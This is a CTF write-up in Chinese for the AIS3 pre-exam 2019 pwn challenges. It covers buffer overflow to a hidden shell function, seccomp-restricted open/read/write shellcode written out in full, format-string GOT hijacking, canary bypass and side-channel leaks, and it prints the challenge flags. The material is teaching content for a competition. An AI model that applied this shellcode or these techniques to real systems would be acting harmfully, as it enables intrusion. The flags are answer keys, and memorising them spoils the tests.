# AIS3 pre-exam 2019
## Run
* 題目 source code 在 src/ 底下。
* 想架起來玩，先編譯，再用 docker-compose 跑起來即可。
```sh
make
docker-compose up --build -d
```
* 或 exploit 用 pwntools 的 process 直接 debug local binary 也行，不過需注意 local 環境與 remote 差異。
## Pwn - write-ups
### bof - 139 Solves
> Tags: buffer overflow, debug 技巧

&emsp;&emsp;因今年收到老師們決議，將 AIS3 pre-exam 與 MyFirst CTF 一同進行，所以前三題的題目難度設計的簡單許多，故將最典型的 bof 作為第一題簽到題，不過都 2019 了，還將 bof 做成題目實在是有點老掉牙，而這題剛好踩到一些點，讓你做最直接的作法，可能會遇到些 bug ，因此設計精神也包含了測驗解題者的 debug 能力，以及發現問題解決問題的思維。

```nasm
  4011df:	e8 4c fe ff ff       	call   401030 <puts@plt>
  4011e4:	48 8d 45 d0          	lea    rax,[rbp-0x30]
  4011e8:	48 89 c7             	mov    rdi,rax
  4011eb:	b8 00 00 00 00       	mov    eax,0x0
  4011f0:	e8 5b fe ff ff       	call   401050 <gets@plt>
```
&emsp;&emsp;透過 `objdump -d ./bof` 可以發現，main function 中使用 gets 來對 local variable char buffer 做輸入，而 gets 是完全不會檢查輸入長度限制的，而 buf 位於 `rbp-0x30` 的位置，意即 buf 的頭到儲存 `old rbp` 的距離為 0x30 ，這並不一定是你在 source code 中宣告的長度，有可能你宣告了 0x20 的 char buffer 而有其他 local variable，`rbp - 0x10` 可能放置其他的 local variable。

&emsp;&emsp;所以我們只要將 0x30 的空隙填滿，再將存放 rbp 的 8 byte 蓋過去，就是我們的目標 return address 了(這部分原理還不熟的可以參考 calling convention, stack frame)，至於 open shell 去讀取位於遠端主機上的 flag 檔案，也可以透過反組譯發現一個奇怪的 function，理論上是不會被執行到的，沒有 function call 它：
```nasm
0000000000401152 <welcome_to_ais3_2019>:
  401152:	55                   	push   rbp
  401153:	48 89 e5             	mov    rbp,rsp
  401156:	48 8d 3d ab 0e 00 00 	lea    rdi,[rip+0xeab]        # 402008 <_IO_stdin_used+0x8>
  40115d:	e8 de fe ff ff       	call   401040 <system@plt>
  401162:	90                   	nop
  401163:	5d                   	pop    rbp
  401164:	c3                   	ret
```
&emsp;&emsp;分析下去可以知道他傳入的第一個參數為 `"sh"` 字串，所以這題經典的 buffer overflow 題目的目標即為想辦法去執行到這個正常行為不會去執行到的函式，當做最直接的作法去覆蓋 return address 成 `0x401152` 時，會發現 crash 了，這題另一個重點來了，希望遇到問題能去 debug 找出問題發生點，以及原因，並解決他，透過 gdb 可以發現：
```nasm
   0x7fb27b8462e6 <do_system+1078>:	movq   xmm0,QWORD PTR [rsp+0x8]
   0x7fb27b8462ec <do_system+1084>:	mov    QWORD PTR [rsp+0x8],rax
   0x7fb27b8462f1 <do_system+1089>:	movhps xmm0,QWORD PTR [rsp+0x8]
=> 0x7fb27b8462f6 <do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0
   0x7fb27b8462fb <do_system+1099>:	call   0x7fb27b836110 <__GI___sigaction>
   0x7fb27b846300 <do_system+1104>:	lea    rsi,[rip+0x39e2f9]        # 0x7fb27bbe4600 <quit>
   0x7fb27b846307 <do_system+1111>:	xor    edx,edx
   0x7fb27b846309 <do_system+1113>:	mov    edi,0x3
[rsp+0x40] : 0x7fff3dc653d8 --> 0x0
```
&emsp;&emsp;gdb 死在這行，很明顯有成功 hijack 程式的執行流程，因為進到 system 中的 do_system funtion ，但是有些原因，在執行這行時 crash 了，這時候找到發生問題的點，便需要去了解發生原因，例如： register 的值是否正確，address 是否不合法等等，而這裡我們也可以發現 rsp 是正常的 stack address，直接講結論就是，movaps 這個指令有要求當是處理 memory 操作且是 xmm 時，address 需要以 0x10-byte 做對齊(alignment)，（可以參考 [here](https://www.felixcloutier.com/x86/movaps)），可以看到此時 rsp 為 `0x7fff3dc653d8 - 0x40` ，是作 8 結尾，並不是 0x10 的倍數，而這就是原因。

&emsp;&emsp;所以此時目標就很簡單了，只要在 stack 是對齊的時候執行這個 function 就行了，有很多種作法，任何只要確保符合不會 crash 的狀況就行：
1. 直接跳到 `0x401156`，跳過 `push rbp` ，就不會使 stack 變成 8 結尾。
2. 會 ROP 的話就在前面塞一個 `ret` 的 gadget 就行了．
3. 意外的發現，有人可能算錯 offset 沒算到 rbp 要加 8 之類的，把 function pointer 蓋到放 rbp 的位置，結果成功，原因為 main return 回 `__libc_start_main` 時，有一行 `call rbp`，此時 stack 是對齊的。

&emsp;&emsp;很多人可能是單純黑箱亂 try 到成功，例如往前往後跳，offset等等，這在某些情況下不一定是個壞方法，不過遇到需要巧妙精細的構造 payload 的情況，可能 cp 值就不高了，理解原理是很重要的。

[exploit.py](https://github.com/yuawn/ais3-2019-pre-exam/blob/master/exploit/bof.py)

#### AIS3{TOO0O0O0O0OO0O0OOo0o0o0o00_EASY}

### orw - 67 Solves
> Tags: shellcoding, syscall

Binary 保護機制：
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
&emsp;&emsp;這題也是非常經典的題目，其實意思差不多就是可以直接 Google 到 write-up 解法，可以發現執行檔的 NX 保護機制沒開，也無 canary，代表倘若知道 shellcode 的位置，可以透過 overflow return address 跳到 shellcode 來執行(有 canary 則需繞過它才能 overflow 到 return address，有 NX 則輸入的 shellcode 為 data 無執行權限)，另外，這題 binary 有上 seccomp rules 的保護，你可以透過一些工具來分析他，例如 [seccomp-tools](https://github.com/david942j/seccomp-tools)：
```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```
&emsp;&emsp;基本上意思就是，除了 open, read, write 以外的 syscall 都會被 kill 掉，所以這題你的 shellcode，要使用 syscall 就只能限制在這三個 syscall 使用，不過這並無大礙，這三個 syscall 已經滿足打開檔案，並從 fd 讀取檔案內容，並輸出出來，而目標檔案當然就是遠端機器上的 flag 了。

&emsp;&emsp;分析會發現，輸入的 buffer 屬於 global variable，而題 binary 沒有 PIE，所以 address 是固定且可知的，後面的 bof 就很明顯了，將 return address 覆蓋成 buffer address，將 shellcode 輸入至 buf 即可，剩下的就是撰寫 shellcode 了，調用 syscall 的方法很簡單，將要調用的 syscall 號數放在 rax 暫存器，並透過 rdi rsi rdx 傳參，踩上 syscall 這個 instruction 就可以了，依序實作出 open read write flag 檔案的 shellcode，這邊附上一個超土炮作法，當然很多種寫法，能完成目的就OK：
```nasm
mov rax, 0x67616c662f77
push rax
mov rax, 0x726f2f656d6f682f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
mov rax, 0
syscall

mov rdi, 0
mov rax, 1
syscall
```
&emsp;&emsp;當然你也可以使用 pwntools 裡的 shellcraft：
```python
from pwn import *

context.arch = 'amd64'

sc = asm(
    shellcraft.pushstr( "/home/orw/flag" ) +
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x100 ) +
    shellcraft.write( 1 , 'rsp' , 0x100 )
)
```
&emsp;&emsp;不過有時候遇到一些 shellcode 小品題，花式 shellcode 或是一些 jail 題，基本上就需要完全理解 shellocde 甚是非常熟練，此時 shellcraft 產出來的直覺寫法，則派不太上用場，所以想練習的人，可以自己完整撰寫看看。

[exploit.py](https://github.com/yuawn/ais3-2019-pre-exam/blob/master/exploit/orw.py)

#### AIS3{B4by_sh311c0d1ng_yeeeeeeeeeeeeeeeeeee_:)}

### hello - 22 Solves
> Tags: format string attack, GOThijacking

&emsp;&emsp;這題沒有 bof，不過很明顯有 fmt 的洞，這裡 fmt 的原理細節就不提了，這題有一次的 fmt 後，緊接著就 `exit(0)` 了，所以想要打下這題，必須先解決這個問題，因為 PIE 沒開，可以知道 exit GOT 的位置，且這題 RELRO 不是全開，所以 got table 可寫，利用第一次的 fmt 來將 main function address 寫入 exit got table，則 call exit 時，會跳至我們的 main function 如此就有一個無限的 fmt 利用機會了。

&emsp;&emsp;但是有個問題，可能會想說 got 裡是一個 libc address ，而 main `0x4006E8`，可能要單次 fmt 寫入多次，如果一次寫 4 byte，則需要輸出 0x4006E8 == 4196072 個字，很容易造成 exploit 不 stable 或是 IO chunk 被截斷等等，所以拆開來寫，可以增加 exploit 的穩定性，而剛好，exit 在還沒被呼叫前，got 裡面存的是 `0x400596` (想了解可以參考 lazy binding, dl_resolve 的機制)，所以我們只需要寫掉末兩 byte 即可，獲得無限次的 fmt 利用後，只需 leak libc，再將 printf got 填入 system，下一次輸入到 buf 的東西，原本應該 `printf( buf )` 則變成 `system( buf )`，輸入 sh 就能開 shell 了。

[exploit.py](https://github.com/yuawn/ais3-2019-pre-exam/blob/master/exploit/hello.py)

#### AIS3{fmt_4ttack_h0000o0ooo0o0k_ex1t}

### PPAP - 8 Solves
&emsp;&emsp;小品題，只能 overflow 到 return address 一個 byte，intended solution 為蓋掉 main 原本 return 回 __libc_start_main 的 address 末一 byte，這樣有 0xff 個選擇，這裡除了可以跳到反組譯出來正常的 instruction 頭，也可以跳到中間，例如一個 5 byte 長的 instrution，直接跳到中間，後 3 個 byte 會解析出別的 instruction ，借此找到更多得 gadget，不過 intended solution 不需要這樣，直接蓋 `'\xe4'` ，return 到 syscall 上，而 rax 可以透過 read() 的 return value 來控制，例如 read 10 個 byte rax 為 10，而 rdi 會是 0，rsi 為我們可以輸入的 bss buffer，rdx 則為先前所輸入的 size ，將 rax 控成 322 ，輸入 `/bin/sh`，就可以執行 `execveat( 0, '/bin/sh', rdx, 0, 0)`， rdx 可為 0 或是指到一個存 0 的地方，所以將 size 輸入成 bss address 即可，而題目故意設計將 `xor r10, r10; xor r8, r8` 嵌在 binary 中，也可以當成一種彩蛋提示。

&emsp;&emsp;另一種解法為，利用 rdx 可控，以及 return 到 `call [rdx+0x168]` 的 gadget，將 `leave; ret` gadget 放好，用`call [rdx+0x168]` 來 call 到 `leave; ret` 做 stack migration。

[exploit.py](https://github.com/yuawn/ais3-2019-pre-exam/blob/master/exploit/ppap.py)

#### AIS3{Return_to_the_syscall_in_libc_PPAP_:D}

### Secure bof - 8 Solves
&emsp;&emsp;類似 jail 題，眼前有一個 bof 但是跨不過去的感覺XD，這題如果發現要求輸入的長度為負數，意即以 unsigned 來看的話會是一個超大的數，會透過 abs() 來轉正，轉正後或原本就是正值，則會檢查不能大於 0xff，這正是 buf 的大小，所以無法 overflow，第一個點是，abs() compile 下去會變 inline 組語，就是做 2的補數運算來完成取正值，如果是輸入 0x80000000 == -2147483648，abs() 出來還是 0x80000000 ，而他因為是負的，所以不會被 `> 0xff` 檢查出來，此時就可以 overflow 了。

&emsp;&emsp;但是第二個關卡是，這題自己實作了一個 canary 的保護機制，來檢查是否發生 overflow，canary 是 16 個 `rand() & 0xff` 產生的 byte，而這題是透過 `srand( time( NULL ) );` 的方式來生 seed ，對於同一 seed 隨機產生出來的數列是固定的，所以我們只要放入建立連線時，產生的相同 `time(0)` 值，即可知道這前 16 個隨機產生的數，將 canary 填一樣的回去，就可以正常的 overflow 了，後續就是典型的 ret2libc。

[exploit.py](https://github.com/yuawn/ais3-2019-pre-exam/blob/master/exploit/secure-bof.py)

#### AIS3{H0w_did_y0u_bypass_my_secure_program_:P}

### shellcode 2019 - 7 Solves
&emsp;&emsp;都 2019 了，shellcode 不能再那麼無趣了XD，這題把 flag 直接讀到 global，然後在 seccomp rules 全禁止 syscall 的條件下跑長度僅能為 0xe 的 shellcode，梗就是 side channel attack，shelloce 將 flag 每個字比較，例如猜第一個字是不是 a 或 b 或 c ...，如果對了，就進入無窮迴圈直到 timeout ，這樣就可以慢慢把 flag leak 出來了。

[exploit.py](https://github.com/yuawn/ais3-2019-pre-exam/blob/master/exploit/shellcode-2019.py)

#### AIS3{s1de_ch4nne1_at74ck!!!}

### box - 7 Solves
Binary 保護機制全開。
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```
TBD
### box++ - 415, 5 Solves
TBD

